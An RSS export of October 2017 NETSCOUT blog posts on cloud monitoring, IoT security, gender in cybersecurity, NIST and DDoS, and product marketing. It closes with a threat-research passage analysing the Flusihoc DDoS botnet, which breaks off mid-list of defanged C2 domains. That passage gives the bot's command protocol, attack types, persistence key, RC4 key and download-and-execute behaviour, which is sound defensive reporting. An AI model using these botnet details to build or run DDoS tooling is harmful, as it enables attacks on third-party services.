<p>A management system providing 360-degree visibility enables the IT team to understand service dependencies across different cloud infrastructures. Creating a joined-up view of services in a multi-cloud environment gives administrators a monitoring and measurement platform, enabling them to guarantee performance levels for an increasingly demanding user base.</p>

<p>A comprehensive service assurance solution will also enable operators to understand underlying application, compute, network and storage workloads, and spot technical problems before they become a problem for user-facing services. IT teams get a complete view of the technology stack from top to bottom, enabling them to conduct thorough, efficient root cause analyses.&nbsp;&nbsp;These capabilities stem from continuously monitoring the IT environment and&nbsp;a constantly updated base of information gathered from across multiple cloud infrastructures.</p>

<p>Complexity needn’t cloud your vision when moving to a more agile, scalable computing infrastructure. Just be sure that integrating your environments is part of your strategy, and layer service assurance over the combined operational data. That will give you a solid platform for maintaining application performance and process flow. After all, a well-managed cloud infrastructure must be built on solid foundations.</p>

<p>~Ron Lifton,&nbsp;Sr. Solutions Marketing Mgr., NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/complexity-cloud-purple.jpg" length="264059" type="image/jpeg"/>
    <guid isPermaLink="false">91934a55-47b0-4956-bb89-70a578687538</guid>
    <pubDate>Fri, 20 Oct 2017 04:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Securing IoT’s</title>
  <link>http://localhost:7996/blog/securing-iots</link>
  <description>Today our lives are “smarter” and more interconnected than ever before, thanks to the many devices known as the “Internet of Things (IoT).” Our televisions are internet-enabled and allow us to “speak” to them and request our favorite shows or movies. We have security cameras that can send us alerts via text message/email or send us a live video. We can remotely turn our lights...</description>
  <content:encoded><![CDATA[<p>Today our lives are “smarter” and more interconnected than ever before, thanks to the many devices known as the “Internet of Things (IoT).” Our televisions are internet-enabled and allow us to “speak” to them and request our favorite shows or movies. We have security cameras that can send us alerts via text message/email or send us a live video. We can remotely turn our lights on or off and change our thermostat from anywhere using our smartphone. We can track our fitness goals by recording our daily steps, heart rate, and sleep patterns on wearable devices where the statistics can be monitored by an app.</p>

<p>While these devices make our lives easier and provide us valuable information, we need to remember that since they are connected to the internet, they are subject to the same risks of compromise as our computers or smartphones. Just as we need to take steps to secure our pc’s or phones from malicious software programs, our IoT devices also require protections against unwelcomed uses. Today’s attackers may target your IoT devices to steal information or to take over your devices to launch attacks against other devices, such as websites or other IoT systems.</p>

<p>In many cases, we are limited to the security controls built into the IoT products by the manufacturers, but it is important to enable any security features offered, wherever possible. These may include:</p>

<ol>
	<li><strong>Change the default password that comes with your IoT device, if available</strong><strong>. </strong>The original passwords may be found in installation documents or online and can be used by an attacker to take over your device.</li>
	<li><strong>Always update to the most recent software versions available</strong>. Device manufacturers may release updated software patches to improve functionality or address security risks. By updating your IoT device (and the applications that work with the IoT’s) when fixes or patches are released, you will be protecting your devices and the information they hold.</li>
	<li><strong>Do your research to identify what information is being collected and/or potentially shared by your IoT device.</strong> You may be able to limit or place some controls over how information is collected and used<strong>.</strong></li>
</ol>

<p>By taking the time to review the security controls available on these devices, you will be able to take advantage of the conveniences and enjoyment that the Internet of Things can add to your life and minimize the risk that they will be misused or compromised.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/IoT_0.jpg" length="130327" type="image/jpeg"/>
    <guid isPermaLink="false">2d803431-3be4-4146-a836-937e378c87a5</guid>
    <pubDate>Thu, 19 Oct 2017 18:53:16 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>IT Security Team</dc:creator>
    </item>
<item>
  <title>I am part of the 1%</title>
  <link>http://localhost:7996/blog/i-am-part-1</link>
  <description>I am part of the 1%, just not THAT one percent. According to SC Magazine, women make up 1% of the C-level executives in the cybersecurity workforce. With October being Cybersecurity awareness month, I wanted to share how I got here in this field.</description>
  <content:encoded><![CDATA[<p>I am part of the 1%, just not THAT one percent. According to SC Magazine, women make up one percent of the C-level executives in the cybersecurity workforce. With October being Cybersecurity awareness month, I wanted to share how I got here, in this field, and maybe my past will explain why there are so few women in cybersecurity and most importantly, what everyone may be doing to contribute to this, and what we can do to prevent this from happening.</p>

<p>There are two events from high school that were most influential in getting me here. The first was my first computer class programming class taught by my female physics teacher. I was hooked. Even then, I do not recall a lot of female students in that programming class. It did not matter to me; I had found my passion, computers. The second most influential event was of the negative type, and if I had not already found my passion, it might have stopped me from pursuing a career in STEM. In my senior year, I was just average in calculus class. My teacher one day after class asked me what I was going to college for, when I said Computer Science, he told me that might not be the right choice, and I would be better served taking Accounting. That one innocent comment could have stopped me from getting a degree in Computer Science, and I wouldn’t be in the role I am in today, as Chief Security Officer of a billion dollar company. We all need to think about how one comment may change the course of a young girl’s career choices. It could be a comment to a daughter, a niece, a student or a young stranger. Believe it or not, kids listen to what we say. Maybe a suggestion to change course when something is challenging is not what we should be doing. If a math or science class was challenging for a young man, would you offer the same advice?&nbsp;</p>

<p>With recent headlines in the sports world, we all know that gender bias still exists. Whether it is a female reporter that covers a professional sports team, a female cybersecurity specialist or a male nurse. It will take a village to make this change. I encourage all the women in cybersecurity to seek out their town’s high school and attend their next career fair. I also encourage everyone to post to this blog with their experiences, both good and bad. The more people that share their experiences, the more likely we are going to grow and not repeat the mistakes of the past. We have all seen the estimate that there will be a shortfall of qualified professionals for cybersecurity of 1.8 million by 2022. We all need to learn from our mistakes and change for the good, starting today.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/community">Community</category>
    <enclosure url="http://localhost:7996/sites/default/files/part_of_1_b.jpg" length="139660" type="image/jpeg"/>
    <guid isPermaLink="false">1a5824d5-4f42-47d4-8838-34ca66f2c444</guid>
    <pubDate>Tue, 17 Oct 2017 12:53:48 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Deb Briggs</dc:creator>
    </item>
<item>
  <title>Simplicity in Return for Accountability</title>
  <link>http://localhost:7996/blog/simplicity-return-accountability</link>
  <description>Week two of National Cyber Security Awareness Month (NCSAM) will showcase how organizations can protect against the most common cyber threats. The week will also look at resources to help organizations strengthen their cyber resilience.</description>
  <content:encoded><![CDATA[<p>Week two&nbsp;of <a href="https://www.dhs.gov/national-cyber-security-awareness-month">National Cyber Security Awareness Month</a>&nbsp;(NCSAM)&nbsp;will “showcase how organizations can protect against the most common cyber threats. The week will also look at resources to help organizations strengthen their cyber resilience, including the use of the National Institute of Standards and Technology Cybersecurity Framework.”</p>

<p>DDoS attacks fit the bill in two ways.</p>

<p>First, DDoS attacks are&nbsp;<a href="https://www.arbornetworks.com/blog/insight/2017-ddos-attack-activity/">very common</a>. Arbor’s ATLAS infrastructure, sourced from 400 global customer deployments, with visibility into approximately 1/3 of all internet traffic, recorded 6.1 million DDoS attacks YTD through September.</p>

<ul>
	<li>22,426/day</li>
	<li>934/hour</li>
	<li>15 per minute</li>
</ul>

<p>Second, DDoS defense and the NIST Cybersecurity Framework came together for the first time this summer.&nbsp;Given the importance of internet availability to our society, and the dynamic nature of DDoS threats,&nbsp;the first ever&nbsp;<a href="https://www.cybersecuritycoalition.org/reports/coalition-creates-first-ever-threat-profile-for-ddos-attacks-using-nist-framework">threat profile for DDoS attacks using the NIST Framework</a> was created by The&nbsp;<a href="https://www.cybersecuritycoalition.org/">Coalition for Cybersecurity Policy and Law</a>. The group focuses on education and collaboration with policymakers on the increasingly complicated legislative and regulatory policies related to cybersecurity. Founding members of the Coalition include Arbor Networks, Cisco, Intel, Microsoft, Oracle, Rapid7, and Symantec.</p>

<p>The goal of the DDoS threat profile “is to ensure the strategic and operational discipline needed to protect and respond to DDoS threats is comprehensively addressed by applying the appropriate recommendations and best practices outlined in the Cybersecurity Framework.”</p>

<p>Taking a step back, the National Institute of Standards and Technology (NIST) was tasked&nbsp;by President Obama, via&nbsp;<a href="https://obamawhitehouse.archives.gov/the-press-office/2013/02/12/executive-order-improving-critical-infrastructure-cybersecurity">Executive Order</a>, to develop “a voluntary risk-based Cybersecurity Framework – a set of industry standards and best practices to help organizations manage cybersecurity risks. The resulting framework, created through collaboration between government and the private sector, uses a common language to address and manage cybersecurity risk in a cost-effective way.” President Trump then issued an&nbsp;<a href="https://assets.documentcloud.org/documents/3718538/Trump-cybersecurity-executive-order.pdf">Executive Order</a>&nbsp;instructing federal agencies to implement the NIST Cybersecurity Framework.</p>

<p>Ed Amoroso, proprietor of&nbsp;<a href="https://www.tag-cyber.com/">TAG Cyber</a>, a training, advisory and consulting firm, thinks the focus of the NIST Cybersecurity Framework&nbsp;<a href="https://threatpost.com/trumps-cybersecurity-executive-order-under-fire/126435/">needs to change</a>, but that ultimately, it should be the&nbsp;sole cybersecurity compliance standard&nbsp;in the U.S. In an&nbsp;<a href="https://www.tag-cyber.com/articles/an-open-letter-to-the-president-elect-on-cyber-security">open letter to the new president</a>&nbsp;on cybersecurity, the first agenda item was:</p>

<p><em>Direct that the NIST Framework shall be the only acceptable cyber security compliance standard in the United States.&nbsp;We have too many compliance frameworks and this diverts the attention of our nation’s cyber defenders from security operations to administrative paperwork. Demand that compliance be done properly, but that it be done only once using the NIST framework.</em></p>

<p>Who wouldn’t welcome simplicity in return for greater accountability in cybersecurity? In a world of kinetic threats and complex defenses, simplicity is progress. Is a single standard a silver bullet? Of course not. See PCI, for example. But I think this approach represents pragmatic, common sense progress.&nbsp; When things seem like they can’t get worse, they usually get better.</p>

<p>Imagine for a moment a world where….&nbsp;</p>

<ul>
	<li>The next Equifax would get evaluated against a common, standard set of best practice criteria.</li>
	<li>Their level of culpability would be proportional to their level of preparedness.</li>
	<li>NIST become the scorecard against which they are measured. A cyber Consumer Reports.</li>
</ul>

<p>Imagine for a moment a world where….</p>

<ul>
	<li>This was all part of a plan for national cybersecurity awareness.</li>
	<li>This was taught like civics once was, part of being a good citizen in a connected world.</li>
</ul>

<p>Imagine for a moment a world where….&nbsp;</p>

<ul>
	<li>All smart phones/connected devices came with age appropriate cyber education required before using the device?</li>
	<li>Banks, brokers gave discounts to customers who take regular security training? More informed customers do fewer dumb things leading to fewer claims, losses, etc etc.</li>
	<li>Businesses made cyber understanding part of the interview process?</li>
</ul>

<p>Pipe dream? Maybe. Leaning on NIST as THE Framework is a step in the right direction at a time when it often feels like we’re wandering lost in the wilderness.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/shutterstock_351566210.jpg" length="107569" type="image/jpeg"/>
    <guid isPermaLink="false">b2843550-eb81-4a0d-8f10-be1f93d0d3a2</guid>
    <pubDate>Wed, 11 Oct 2017 18:36:38 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>Business Analytics and Assurance</title>
  <link>http://localhost:7996/blog/business-analytics-and-assurance</link>
  <description>Digital transformation has given birth to a variety of new digital business models, which rely on an increasingly global and connected world. Digital transformation thrives on flexibility and agility, requiring companies to seamlessly and confidently operate across this connected world. To succeed, enterprises must not only transform their business to fulfill new growth...</description>
  <content:encoded><![CDATA[<p><a href="https://www.netscout.com/solutions/digital-transformation">Digital transformation</a> has given birth to a variety of new digital business models, which rely on an increasingly global and connected world. Digital transformation thrives on flexibility and agility, requiring companies to seamlessly and confidently operate across this connected world. To succeed, enterprises must not only transform their business to fulfill new growth potential and digital objectives, but also adjust IT goals to support the transformation.</p>

<p>While that sounds like a technical challenge, it’s really a business imperative: When business fortunes rise and fall on how quickly and easily your company can deliver new business services, making sure that your global IT infrastructure is built to support a connected business model is a vital foundational element.</p>

<p>Companies face some complex issues, including the following:&nbsp;</p>

<ul>
	<li>Developing the ability to modernize, rapidly iterate, and scale applications to support increasingly demanding business needs.</li>
	<li>Assuring the performance of these applications while mitigating security risks.</li>
	<li>Streamlining and managing a complex and changing IT infrastructure to support rapid adoption of pillars of digital innovation such as cloud, IoT, and big data analytics.</li>
</ul>

<p>By combining service assurance, which protects against system, network, and application failures, with security assurance, which shields companies from cyberthreats, companies can reach next-generation levels of service availability, reliability, and responsiveness.</p>

<p>We call this concept business assurance, and it represents the degree of confidence that an information- and services-driven business will operate properly in a consistent manner. &nbsp;</p>

<p>This is a distinctly different approach that lets networking and security professionals work from the same source of intelligence to accurately pinpoint the cause of service degradations and outages. We can do this by applying a consistent single source of truth to intelligently identify the root cause of the problem as part of the threat response lifecycle.</p>

<p><strong>Leveraging Smart Data</strong></p>

<p>The increased complexity of IT infrastructures highlights the value of the data moving across the connected world, and business assurance is built to maximize that value. The key to success lies in taking a data-driven approach. We convert internet traffic into smart data with <a href="https://www.arbornetworks.com/research/security-intelligence">ATLAS Global Threat Intelligence</a>, which is based on analysis of one-third of the global internet traffic. Through our patented Adaptive Service Intelligence<sup>™</sup> (ASI) technology, we transform intranet traffic and cloud application flows into high value, multi-dimensional metadata—smart data—in real time, at the collection point. These primary smart data are then complemented with data from a variety of systems and sources, such as XFlow, active testing, management information base (MIB) queried with Simple Network Management Protocol (SNMP), and log files. &nbsp;&nbsp;</p>

<p>NETSCOUT’s recent integration of ASI-driven smart data generated by <a href="https://www.netscout.com/product/isng-platform">InfiniStreamNG<sup>™ </sup>(ISNG) with Spectrum</a> is a cornerstone of this concept, deriving extended value by using internet and intranet traffic and cloud application flows as the same data source for&nbsp;<a href="https://www.netscout.com/press-release/netscout-enters-advanced-threat-market-unique-intelligent-solution?ls=SEC-SOC-Share&amp;lsd=SEC-Prelease-ISNGSpectrum">both service and security assurance</a>. This drives some pretty valuable synergy, as Network Operations and Security Operations start to collaborate more efficiently and establish a common situational awareness.&nbsp;Ultimately, this helps them better manage incident response, including problem/threat detection, mitigation, and remediation based on effective root-cause analysis. Even better, the walls start coming down in IT, supporting the streamlined process necessary for reinforcing a connected business model.</p>

<p>Retaining control over end-to-end business assurance during digital transformation is a key consideration. The big risk lies in the temptation to rely on an increasing number of infrastructures, platforms, and software as service providers help address business assurance challenges. While these providers offer a variety of management tools for their respective domains, they lack the breadth and depth necessary for pervasive visibility across domains.&nbsp; NETSCOUT’s ISNG and <a href="https://www.netscout.com/product/vstream">vSCOUT</a> virtual appliances offer pervasive visibility in hybrid and multi-cloud environments, enabling IT to retain control and govern service and security assurance anywhere.&nbsp; &nbsp;</p>

<p><a href="http://www.nfvzone.com/topics/nfv/articles/434385-assuring-business-outcomes-your-dx-journey.htm">Click here</a> to learn more about how business assurance can help achieve desirable business outcomes on your DX journey.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/business_assurance_1.jpg" length="714797" type="image/jpeg"/>
    <guid isPermaLink="false">19d5ecfb-1bab-4329-a8c5-6a280af394cd</guid>
    <pubDate>Tue, 10 Oct 2017 17:42:04 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>The Second Wave of Packet Broker Disaggregation</title>
  <link>http://localhost:7996/blog/second-wave-packet-broker-disaggregation</link>
  <description>Written by Dr. Jim Metzler Dr. Jim Metzler is widely recognized as an authority on both network technology and its business applications. In over 28 years of professional experience, Jim has assisted numerous vendors refine their product and service strategies, and helped tens of enterprises evolve their network infrastructure. In a recent blog, I discussed how a product that...</description>
  <content:encoded><![CDATA[<div style="background-color: #F5F5F5;margin: 20px 0 20px;padding: 20px;border: 1px solid #DDDDDD;"><img alt="Dr. Jim Metzler" src="https://www.netscout.com/sites/default/files/Jim_Metzler100x100.jpg" style="float:left;margin-right:15px;max-width:100px;" /><strong><em>Written by Dr. Jim Metzler</em></strong><br />
Dr. Jim Metzler is widely recognized as an authority on both network technology and its business applications. In over 28 years of professional experience, Jim has assisted numerous vendors refine their product and service strategies, and helped tens of enterprises evolve their network infrastructure.</div>

<p>In a recent blog, I discussed how a product that NETSCOUT introduced in June 2017, the nGenius® 5000 series Packet Flow Systems (PFS), is disrupting the packet broker market. In contrast to a typical vendor-locked packet broker, the <a href="https://www.netscout.com/product/enterprise/ngenius-5000-series-packet-flow-switch">nGenius 5000 series packet flow switch</a> disaggregates the software from the hardware and provides either an integrated appliance or software that runs on commodity hardware. I will use this blog to explain how NETSCOUT’s recently announced nGenius&nbsp;Packet Flow eXtender (PFX) leverages the evolving X86 server architecture to create the second wave of packet broker disaggregation.</p>

<p>Most people recognize that the price/performance of X86-based servers has improved dramatically over the last several decades, due to both per-core performance improvements and the growth in the number of cores per server. Software that fully leverages the multicore X86 architecture will continue to benefit from a new generation of price/performance improvements in X86-based servers.</p>

<p>The recently announced PFX is a software product that runs on the NETSCOUT InfiniStreamNG<sup>™</sup>&nbsp;(ISNG) platform. As such, PFX fits in nicely with the megatrend in the IT industry towards more software-based products. As part of the nGenius Packet Flow Systems portfolio from NETSCOUT, the PFX software integrates with the nGenius packet flow switches to form a flexible, yet full-featured visibility network. The switches enable the base packet broker functionality, while PFX is designed for advanced-level packet conditioning. As such, one can deploy PFX capabilities at any point on the visibility network, with PFS devices as its backbone—organized in a dynamic, self-healing mesh. One of the benefits of such a mesh is that it shares the load across multiple devices which increases both the scalability and the availability of the solution.</p>

<p>As noted, one benefit that comes from leveraging the X86 multicore architecture is that it results in a significantly lower price point. According to NETSCOUT, the cost of the overall solution, combining base (PFS switches) and advanced (PFX software) capabilities, is roughly 50 percent of the cost of comparative vendor-locked systems. Another benefit is that the PFX that was recently announced has the processing power to support a number of advanced packet processing features, including:</p>

<ul>
	<li>NetFlow generation, e.g. v5, v9 and IPFIX</li>
	<li>IP tunnel termination</li>
	<li>Header stripping</li>
	<li>De-duplication</li>
</ul>

<p>While supporting the features listed above is important, when enterprise IT organizations adopt a monitoring solution, they want that solution to be effective for an extended period of time. Because it leverages the multicore X86 architecture and its ongoing price/performance improvements, PFX will have the processing power that is necessary to support additional packet processing functionality well into the future. Development cycles should also be considerably shorter vs those that need to accommodate custom hardware.</p>

<p>I am intrigued by the monitoring possibilities that NETSCOUT could bring by combining its service assurance, cybersecurity, and packet flow management capabilities into a single architecture. Lots to watch for in this space.</p>

<p><em>~ Dr. Jim Metzler, Managing Partner, Ashton Metzler</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/shutterstock_661115062_b.jpg" length="169375" type="image/jpeg"/>
    <guid isPermaLink="false">017a0316-419f-4bd3-85d4-e1f4b4128b33</guid>
    <pubDate>Wed, 04 Oct 2017 13:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Connected Cars Offer Massive IoT Opportunity</title>
  <link>http://localhost:7996/blog/connected-cars-offer-massive-iot-opportunity</link>
  <description>The low latency, five-nines reliability, likely 100 percent coverage, and ability to provide 10 times the bandwidth per connection to 10 times the number of connections, makes 5G technology perfectly suited for many IoT applications. A 5G network can deliver 50-megabits-per-second connectivity everywhere once networks are fully rolled out and bandwidth-intensive, mission...</description>
  <content:encoded><![CDATA[<p>The low latency,&nbsp;five-nines reliability, likely 100 percent coverage, and ability to provide 10 times the bandwidth per connection to 10 times the number of connections, makes 5G technology perfectly suited for many IoT applications. A 5G network can deliver 50-megabits-per-second connectivity everywhere once networks are fully rolled out and bandwidth-intensive, mission-critical IoT applications become possible and practical at massive volumes. Connected vehicles are just one set of IoT applications that by definition require coverage because of their mobility, low latency, because of the need to stream large volumes of rich data uninterrupted, and reliability, because they will be increasingly relied upon to enable mission-critical applications such as assisted driving and <a href="https://www.thebalance.com/auto-usage-based-insurance-4132461" target="_blank">usage-based insurance</a> (UBI).</p>

<p>5G has the potential to enable large numbers of connected car applications and enable the business models of car leasing and the servitization of cars through pay-per-use. New opportunities and business models for car-makers will emerge as alternatives or replacements to the traditional model of selling cars to consumers. Instead users will pay for miles driven or hours of operation for fleet vehicles that they can use, subject to service membership. Vehicle service providers will be able to add value and differentiate their offerings by pre-loading rental vehicles with users’ preferences such as their preferred music, seat settings, temperature and mapping and infotainment.</p>

<p>The business case for this is already apparent in UBI where insurers can more accurately charge customers based on their driving habits and use car data to apportion responsibility for accidents with greater accuracy, for example. The savings insurers can make from the data-connected systems provide far outweigh the costs of deploying in-vehicle hardware and paying for connectivity.</p>

<p style="text-align: center;"><img alt="car-1458720_1920.jpg" height="322" src="https://images4.newscred.com/Zz02MWNhZGUzNmZlNGVjMjMyMGRiMDBhNDg4NmJmNDc5Zg==" style="margin-left: auto; margin-right: auto;" width="573.5064935064935" /></p>

<p>In addition, there are high-value services associated with monitoring of vehicles and drivers both for their employers, lease and fleet management companies and vehicle makers’ research and preventative maintenance activities. Further to these are applications that involve utilizing connected cars as a hub for infotainment, applications and content consumed in cars. 5G, because of its ubiquity and capacity, is a logical connection technology that can handle the volume of data traffic required and enable vehicle providers to standardize across global markets.&nbsp;</p>

<p><img alt="Teenage Children Using Digital Devices On Family Road Trip" height="322" src="https://images3.newscred.com/Zz1hODQ5M2NiYjc0ZmI1ZDJlZTVjODc0MmI4ZGQxZjc0YQ==" style="display: block; margin-left: auto; margin-right: auto;" width="483" /></p>

<p>As the connected car market matures, more mission-critical apps such as assisted and ultimately autonomous driving will come to market. 5G can be an enabler for these services, which come with significant risks and will require the strong security that is inherent to 5G plus the traditional cellular network attributes of zero downtime and low latency.</p>

<p>The level of service required here will be similar to that required by remote surgery; mistakes simply can’t be made.</p>

<p>Accuracy and availability are vital attributes for this market to move ahead. It is heavily regulated and will involve substantial liabilities for connected vehicle service providers and their insurers should anything go wrong. However, the benefits of early-to-market connected driving applications such as the platooning of heavy goods vehicles—whereby a group of trucks drives along bumper to bumper, controlled only by the driver of the first truck in the line—are substantial. Platooning, which is being trialed in the United States and several European markets right now, offers greater fuel efficiency, decreased driver stress and improved road safety.</p>

<p>Carriers will need to be profitably compensated for the 5G services they provide that enable these new business models. This won’t be a traditional network access model because that is unattractive to carriers and carriers will be asked to provide far more than network access. To underpin the network quality connected car services require, carriers will not only have to provide the service level requested, they’ll have to prove they are doing so in order to demonstrate compliance with regulation and also to justify the premium charges they will make for delivering this high-bandwidth, high-availability network.</p>

<p>This future market is only a few years away from reality. To take up their place in it, carriers need to set up and roll out their 5G networks, learning new skills along the way, such as network slicing to dimension capacity for specific applications. They’ll also need to add to their monitoring and big data analytics capabilities in order to assure services and to generate the data new connected car business models will need to succeed. The effort will be worth the reward as carriers transform from network providers to genuine platform providers across 5G-enabled industries.</p>

<p>Connected cars will be only one of the many opportunities 5G brings to carriers to redefine their role in the value chains of many vertical and horizontal industries.</p>

<p><em>~ Written by&nbsp;George Malim. George&nbsp;is a freelance journalist who covers the telecoms and internet markets.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz01YTkwYjc5NzY0N2Q3MGU3NWM5ZjNjMDMyNGFlZjRlZQ.jpg" length="207275" type="image/jpeg"/>
    <guid isPermaLink="false">8200a3cc-efbe-4e2f-9e4e-dcfe072d8212</guid>
    <pubDate>Tue, 03 Oct 2017 14:11:28 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>The Flusihoc Dynasty, A Long Standing DDoS Botnet</title>
  <link>http://localhost:7996/blog/asert/flusihoc-dynasty-long-standing-ddos-botnet</link>
  <description>Since 2015, ASERT has observed and followed a DDoS Botnet named Flusihoc. To date very little has been published about this family, despite numerous anti-virus and intrusion detection signatures created by various vendors. Flusihoc has remained persistent with multiple variants, over 500 unique samples in our malware zoo, and continued development. Flusihoc is a versatile C++...</description>
  <content:encoded><![CDATA[<p>Since 2015, ASERT has observed and followed a DDoS Botnet named Flusihoc. To date very little has been published about this family, despite numerous anti-virus and intrusion detection signatures created by various vendors. Flusihoc has remained persistent with multiple variants, over 500 unique samples in our malware zoo, and continued&nbsp;development. Flusihoc is a versatile C++ malware capable of a variety of DDoS attacks as directed by a Command and Control server. We have decided to take a look at this malware family due to a recent uptick in observed activity. This post will discuss this family, its features and observed activity over the years.</p>

<h2>Possible Chinese Origin</h2>

<p>The geolocation of the identified C2 addresses and static attributes of the malware suggest that Flusihoc may be of Chinese origin. Looking at Flusihoc samples, we find debug strings such as:</p>

<blockquote>C:\Users\chengzhen\Desktop\svchost\Release\svchost.pdb</blockquote>

<p>bearing the word Chengzhen which translates to the phrase, “to become true”, in English from Chinese. Additionally, other samples contained debug strings and values which included Chinese characters. Looking at PE resources of samples we find a large portion of samples have Chinese_Simplified language resources. It is important to note these points could be part of the attacker’s intentional effort to mislead researchers.</p>

<h2>Command and Control (C2) Communications</h2>

<p>Flusihoc communicates with its C2 via HTTP in plain text. An example C2 communication looks like:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/10/Picture1.png" /></p>

<p>The C2 uses a command structure based on numbers; the bot will receive a number and respond appropriately based on the command associated with that number value. The communication strings are separated by "<strong>|</strong>" characters and terminated with the string "<strong>end</strong>". ASERT identified the following&nbsp;numbered commands: <strong>1</strong> - Requests the bot to send infected system information; this command will prompt the bot to return information such as, operating system name, CPU details, RAM size and network speed. <strong>22</strong> - Tells the bot to check for attack payloads and send a "<strong>null</strong>" to the C2 if it has not previously received a payload. If the bot responds with a “<strong>null</strong>”, the C2 will send a blob of text which the bot will parse out and use for its attack payloads. If the bot already has an attack payload it will send an "<strong>end</strong>" to the C2. <strong>333</strong> - Gets attack status and will prompt the bot to send a "<strong>Busy</strong>" or "<strong>Idle</strong>" message based on if it is actively attacking a target. <strong>4444</strong> - Commands the bot to stop the current attack Additionally, the C2 will send a command in this format to initiate an attack:</p>

<blockquote>&lt;attack command #&gt;|&lt;target&gt;|&lt;port&gt;|&lt;# of threads&gt;|&lt;uri&gt;|&lt;attack type&gt;\n…end</blockquote>

<h2>DDoS Attack Types</h2>

<p>Flusihoc is capable of 9 types of DDoS attacks:</p>

<ul>
	<li>SYN_Flood (1)</li>
	<li>UDP_Flood (2)</li>
	<li>ICMP_Flood (3)</li>
	<li>TCP_Flood (4)</li>
	<li>HTTP_Flood (5)</li>
	<li>DNS_Flood (6)</li>
	<li>CON_Flood (7)</li>
	<li>CC_Flood (8)</li>
	<li>CC_Flood2 (9)</li>
</ul>

<p>These attack types are sent by the C2 in string format for the bot to parse and issue attacks based off of.&nbsp; The mechanisms used to conduct these attacks vary by attack type and variant primarily utilizing <strong>Winsock2</strong> from the Windows SDK.</p>

<h2>Observed Improvements and Changes</h2>

<h3>Removed then Re-Added Persistence</h3>

<p>Early variants of Flusihoc such as this sample available <a href="https://www.virustotal.com/en/file/e2d2b5746990c06b84d4cbe2df76f882e792de3549f64d941a31e4e38c660656/analysis/">on VirusTotal</a>&nbsp;used a persistence registry entry in '<strong>Software\Microsoft\Windows\CurrentVersion\Run</strong>'. However, in later samples, this persistence mechanism is not present in a large portion of samples. This may be to evade detection however, it also makes it harder for the bot to restart after a system reboot. In newer samples, we see the Flusihoc authors bring back this persistence mechanism, presumably due to the difficulties maintaining persistence after the run entry was removed.</p>

<h3>Encrypted C2 Address</h3>

<p>Flusihoc also transitioned from a plaintext C2 to a RC4 encrypted C2 address in later variants. In a sample with a March 2017 compilation date, available <a href="https://www.virustotal.com/en/file/d516fb73271cce3391340d71b0f2c6be6c1347cb81abb7eb272da46b0caaaa1b/analysis/">on VirusTotal</a>, we can see the C2 address in plaintext:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/10/Picture2.png" /></p>

<p>However, we see an encrypted C2 in a newer sample <a href="https://www.virustotal.com/en/file/6e4c85916dc98ea5ac981157f2a4adae3384009b646f6835a570c6b3c1083850/analysis/">on VirusTotal</a> with a compilation date in April 2017. In this sample, the C2 looks similar to the March 2017 variant however, instead of a plain text C2, we have an encrypted C2:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/10/Picture3.png" /></p>

<p>The bot then calls a function that employs standard RC4 encryption to decrypt the C2 value with a key. In the case of this sample the RC4 key was "<strong>crealloc</strong>" which we found within the byte ptr of the RC4 decryption function seen below: <ing src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/10/Picture4.png" width="700"> The RC4 function is standard and when given the above encrypted C2 value and the key you will get the C2 address of:&nbsp; <strong>Main[.]dresou[.]net</strong></ing></p>

<h3>Download and Execute Functionality</h3>

<p>In the same sample from April 2017, we found new functionality where the bot will download and execute a file using the Windows API functions <strong>URLDownloadToFileA</strong>, <strong>WinExec</strong> and <strong>ShellExecuteA</strong>. If the file ends with "<strong>exe</strong>" it will download a file from the provided URL and execute it.</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/10/Picture5.png" /></p>

<p>If the file name does not end with "<strong>exe</strong>", it will run it with ShellExecuteA using the "<strong>open</strong>" operation.</p>

<p><img src=" https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/10/Picture6.png" /></p>

<p>This feature allows the botnet controller to update Flusihoc malware or download additional malicious files remotely.</p>

<h2>Campaign activity</h2>

<h3>C2s Discovered</h3>

<p>Using our botnet infiltration system, ASERT has tracked 154 different C2s associated with Flusihoc issuing 24,137 attacks commands since July 2015. 48 C2s are still active as of Sept. 2017. below are the C2s generating the most attack commands:</p>

<ul>
	<li>wm[.]sshtdk[.]com</li>
	<li>1211[.]sshtdk[.]com</li>
	<li>121[.]sshtdk[.]com</li>
